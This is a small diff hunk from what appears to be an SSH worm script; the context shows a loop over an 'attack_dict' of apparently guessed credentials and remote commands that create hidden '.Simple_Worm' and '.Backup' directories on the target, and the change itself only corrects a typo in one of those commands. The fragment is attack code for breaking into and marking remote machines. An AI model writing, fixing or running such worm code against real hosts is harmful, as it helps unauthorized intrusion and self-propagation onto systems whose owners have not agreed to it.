@@ -25,7 +25,7 @@ for key in attack_dict:
         break
 
 stdio, stdout, stderr = ssh.exec_command('mkdir -p /home/attacker/Public/.Simple_Worm')
-stdio, stdout, stderr = ssh.exec_command('mkdir -p is /home/attacker/Desktop/.Backup')
+stdio, stdout, stderr = ssh.exec_command('mkdir -p /home/attacker/Desktop/.Backup')
 if ssh != None:
     ssh.close()
     del ssh, stdio, stdout, stderr
